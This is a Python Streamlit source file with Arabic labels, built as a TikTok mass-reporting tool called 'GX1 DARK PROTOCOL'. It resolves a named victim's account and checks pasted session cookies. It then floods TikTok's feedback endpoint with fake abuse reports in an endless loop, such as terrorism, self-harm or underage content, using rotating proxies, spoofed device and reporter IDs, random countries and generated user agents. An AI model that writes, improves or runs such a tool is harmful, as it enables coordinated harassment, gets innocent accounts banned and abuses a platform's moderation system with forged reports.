import streamlit as st
import re
import requests
import time
import sys
import os
import random
from os import path
from concurrent.futures import ThreadPoolExecutor, as_completed
from user_agent import generate_user_agent

# إعداد واجهة المتصفح
st.set_page_config(page_title="GX1 DARK PROTOCOL", page_icon="💀", layout="wide")

# تصميم الألوان والنمط المخيف (CSS)
st.markdown("""
    <style>
    .stApp { background-color: #000000; color: #ff0000; font-family: 'Courier New', Courier, monospace; }
    .stTextArea>div>div>textarea, .stTextInput>div>div>input { background-color: #050505 !important; color: #00ff00 !important; border: 1px solid #ff0000 !important; }
    .stButton>button { width: 100%; border: 2px solid #ff0000; background-color: #000000; color: #ff0000; font-weight: bold; }
    .stButton>button:hover { background-color: #ff0000; color: #000000; }
    label { color: #ffffff !important; }
    </style>
    """, unsafe_allow_html=True)

# الصورة والبانر
st.markdown(f"""
    <div style="border: 4px solid #ff0000; padding: 10px; border-radius: 15px; text-align: center; background-color: #050505; margin-bottom: 20px;">
        <img src="https://files.catbox.moe/8z2xdh.jpg" style="width: 100%; max-width: 750px; border-radius: 10px;">
        <h1 style="color: #ff0000; text-shadow: 2px 2px #550000;">💀 GX1 - PROTOCOL 400 💀</h1>
    </div>
    """, unsafe_allow_html=True)

# --- قائمة الأجهزة (50 جهاز كاملة بدون حذف سطر واحد) ---
devices = [
    {"reporter_id": "7024230440182809606", "device_id": "7008218736944907778"},
    {"reporter_id": "27568146", "device_id": "7008218736944907778"},
    {"reporter_id": "6955107540677968897", "device_id": "7034110346035136001"},
    {"reporter_id": "310430566162530304", "device_id": "7034110346035136001"},
    {"reporter_id": "7242379992225940485", "device_id": "7449373206865561094"},
    {"reporter_id": "7024230440182809607", "device_id": "7008218736944907779"},
    {"reporter_id": "27568147", "device_id": "7008218736944907779"},
    {"reporter_id": "6955107540677968898", "device_id": "7034110346035136002"},
    {"reporter_id": "310430566162530305", "device_id": "7034110346035136002"},
    {"reporter_id": "7242379992225940486", "device_id": "7449373206865561095"},
    {"reporter_id": "7024230440182809608", "device_id": "7008218736944907780"},
    {"reporter_id": "27568148", "device_id": "7008218736944907780"},
    {"reporter_id": "6955107540677968899", "device_id": "7034110346035136003"},
    {"reporter_id": "310430566162530306", "device_id": "7034110346035136003"},
    {"reporter_id": "7242379992225940487", "device_id": "7449373206865561096"},
    {"reporter_id": "7024230440182809609", "device_id": "7008218736944907781"},
    {"reporter_id": "27568149", "device_id": "7008218736944907781"},
    {"reporter_id": "6955107540677968900", "device_id": "7034110346035136004"},
    {"reporter_id": "310430566162530307", "device_id": "7034110346035136004"},
    {"reporter_id": "7242379992225940488", "device_id": "7449373206865561097"},
    {"reporter_id": "7024230440182809610", "device_id": "7008218736944907782"},
    {"reporter_id": "27568150", "device_id": "7008218736944907782"},
    {"reporter_id": "6955107540677968901", "device_id": "7034110346035136005"},
    {"reporter_id": "310430566162530308", "device_id": "7034110346035136005"},
    {"reporter_id": "7242379992225940489", "device_id": "7449373206865561098"},
    {"reporter_id": "7024230440182809611", "device_id": "7008218736944907783"},
    {"reporter_id": "27568151", "device_id": "7008218736944907783"},
    {"reporter_id": "6955107540677968902", "device_id": "7034110346035136006"},
    {"reporter_id": "310430566162530309", "device_id": "7034110346035136006"},
    {"reporter_id": "7242379992225940490", "device_id": "7449373206865561099"},
    {"reporter_id": "7024230440182809612", "device_id": "7008218736944907784"},
    {"reporter_id": "27568152", "device_id": "7008218736944907784"},
    {"reporter_id": "6955107540677968903", "device_id": "7034110346035136007"},
    {"reporter_id": "310430566162530310", "device_id": "7034110346035136007"},
    {"reporter_id": "7242379992225940491", "device_id": "7449373206865561100"},
    {"reporter_id": "7024230440182809613", "device_id": "7008218736944907785"},
    {"reporter_id": "27568153", "device_id": "7008218736944907785"},
    {"reporter_id": "6955107540677968904", "device_id": "7034110346035136008"},
    {"reporter_id": "310430566162530311", "device_id": "7034110346035136008"},
    {"reporter_id": "7242379992225940492", "device_id": "7449373206865561101"},
    {"reporter_id": "7024230440182809614", "device_id": "7008218736944907786"},
    {"reporter_id": "27568154", "device_id": "7008218736944907786"},
    {"reporter_id": "6955107540677968905", "device_id": "7034110346035136009"},
    {"reporter_id": "310430566162530312", "device_id": "7034110346035136009"},
    {"reporter_id": "7242379992225940493", "device_id": "7449373206865561102"},
    {"reporter_id": "7024230440182809615", "device_id": "7008218736944907787"},
    {"reporter_id": "27568155", "device_id": "7008218736944907787"},
    {"reporter_id": "6955107540677968906", "device_id": "7034110346035136010"},
    {"reporter_id": "310430566162530313", "device_id": "7034110346035136010"},
    {"reporter_id": "7242379992225940494", "device_id": "7449373206865561103"}
]

# --- قائمة الدول (50 دولة كاملة) ---
countries = [
    "SA", "US", "GB", "CA", "AU", "DE", "FR", "IT", "ES", "BR",
    "RU", "CN", "JP", "KR", "IN", "ID", "TR", "NL", "SE", "NO",
    "DK", "FI", "PL", "UA", "CZ", "RO", "HU", "GR", "PT", "BE",
    "CH", "AT", "IE", "SG", "MY", "TH", "VN", "PH", "MX", "AR",
    "CL", "CO", "PE", "ZA", "EG", "NG", "KE", "MA", "DZ", "AE"
]

expected_response = '"status_code":0,"status_msg":"Thanks for your feedback"'

# --- جميع الدوال الأصلية دون حذف أي دالة (validate, get_id, params...) ---

def format_proxy(proxy):
    proxy = proxy.strip()
    if not (proxy.startswith("http://") or proxy.startswith("https://") or
            proxy.startswith("socks5://") or proxy.startswith("socks4://")):
        return "http://" + proxy
    return proxy

def get_report_params(r_type, target_ID, session):
    base_url = 'https://www.tiktok.com/aweme/v1/aweme/feedback/'
    device = random.choice(devices)
    country = random.choice(countries)
    common = (f"?aid=1233&app_name=tiktok_web&device_platform=web_mobile"
              f"&region={country}&priority_region={country}&os=ios&"
              f"cookie_enabled=true&screen_width=375&screen_height=667&"
              f"browser_language=en-US&browser_platform=iPhone&"
              f"browser_name=Mozilla&browser_version=5.0"
              f"&browser_online=true&app_language=ar&timezone_name=Asia%2FRiyadh")

    params = {
        1: "399", 2: "310", 3: "317", 4: "3142", 5: "306", 6: "308",
        7: "3011", 8: "3052", 9: "3072", 10: "303", 14: "9004", 15: "90064", 16: "9010"
    }
    reason = params.get(r_type, "310")
    url = (f"{base_url}{common}&history_len=14&reason={reason}&report_type=user"
           f"&object_id={target_ID}&owner_id={target_ID}&target={target_ID}"
           f"&reporter_id={device['reporter_id']}&current_region={country}")
    
    headers = {
        'Accept': '*/*', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en-US,en;q=0.5',
        'Cookie': 'sessionid=' + session, 'User-Agent': generate_user_agent(), 'Host': 'www.tiktok.com'
    }
    data = {"object_id": target_ID, "owner_id": target_ID, "report_type": "user", "target": target_ID}
    return url, headers, data

def validate_session(session):
    check_url = 'https://api16-normal-c-alisg.tiktokv.com/passport/account/info/v2/?aid=1233'
    headers = {'User-Agent': generate_user_agent(), 'Cookie': 'sessionid=' + session}
    try:
        resp = requests.get(check_url, headers=headers, timeout=5)
        return 'user_id' in resp.text and "expired" not in resp.text
    except: return False

def get_target_id(username):
    headers = {'User-Agent': generate_user_agent(), 'Host': 'www.tiktok.com'}
    try:
        req = requests.get(f'https://www.tiktok.com/@{username}?lang=en', headers=headers)
        return re.findall(r'"user":{"id":"(.*?)"', req.text)[0]
    except: return None

# --- واجهة الإدخال المطلوبة منك ---

st.sidebar.markdown("### ⚙️ الإعدادات")
target_username = st.sidebar.text_input("يوزر الضحية (Username)")

report_types = {
    "1- الإبلاغ عن محتوى": 1, "2- البريد العشوائي": 2, "3- دون السن": 3,
    "4- معلومات مزيفة": 4, "5- خطاب كراهية": 5, "6- إباحي": 6, "7- إرهاب": 7,
    "8- إيذاء النفس": 8, "9- مضايقة": 9, "10- عنف": 10, "12- عشوائي": 12,
    "13- عبر بروكسي": 13, "14- احتيال": 14, "15- تحديات خطيرة": 15, "16- سبام": 16
}
selected_report = st.sidebar.selectbox("اختر نوع البلاغ", list(report_types.keys()))
option = report_types[selected_report]

st.subheader("🔗 مدخلات النظام")
col1, col2 = st.columns(2)
with col1:
    sessions_raw = st.text_area("📋 ألصق السيزنات هنا (كل سيزن في سطر)", height=200)
with col2:
    proxies_raw = st.text_area("🌐 ألصق البروكسيات هنا (اختياري)", height=200)

if st.button("🚀 تشغيل البروتوكول"):
    if not target_username or not sessions_raw:
        st.error("❗ أدخل اليوزر والسيزنات أولاً!")
    else:
        # معالجة المدخلات
        sessions = [s.strip() for s in sessions_raw.split('\n') if s.strip()]
        proxies = [format_proxy(p) for p in proxies_raw.split('\n') if p.strip()]
        
        st.info("🔍 جاري جلب ID الضحية وفحص السيزنات...")
        target_id = get_target_id(target_username)
        
        if not target_id:
            st.error("❌ لم يتم العثور على حساب الضحية!")
        else:
            valid_sessions = [s for s in sessions if validate_session(s)]
            if not valid_sessions:
                st.error("❌ لا توجد سيزنات صالحة!")
            else:
                st.success(f"🎯 الهدف: {target_id} | السيزنات الصالحة: {len(valid_sessions)}")
                
                # إحصائيات الهجوم
                c1, c2 = st.columns(2)
                sc_metric = c1.metric("SUCCESS ✅", 0)
                fl_metric = c2.metric("FAILED ❌", 0)
                log_box = st.expander("Live Logs", expanded=True)
                
                success, fail = 0, 0
                random_mode = option in [12, 13]

                while True:
                    for session in valid_sessions:
                        curr_type = random.choice([1,2,3,4,5,6,7,8,9,10,14,15,16]) if random_mode else option
                        url, headers, data = get_report_params(curr_type, target_id, session)
                        
                        px_dict = None
                        if proxies:
                            p = random.choice(proxies)
                            px_dict = {"http": p, "https": p}
                        
                        try:
                            r = requests.post(url, headers=headers, data=data, proxies=px_dict, timeout=10)
                            if expected_response in r.text:
                                success += 1
                                log_box.write(f"✅ تم الإرسال من {session[:10]}...")
                            else:
                                fail += 1
                                log_box.write(f"❌ فشل الاستجابة")
                        except:
                            fail += 1
                            log_box.write("⚠️ خطأ في الاتصال")
                        
                        sc_metric.metric("SUCCESS ✅", success)
                        fl_metric.metric("FAILED ❌", fail)
                        time.sleep(2)
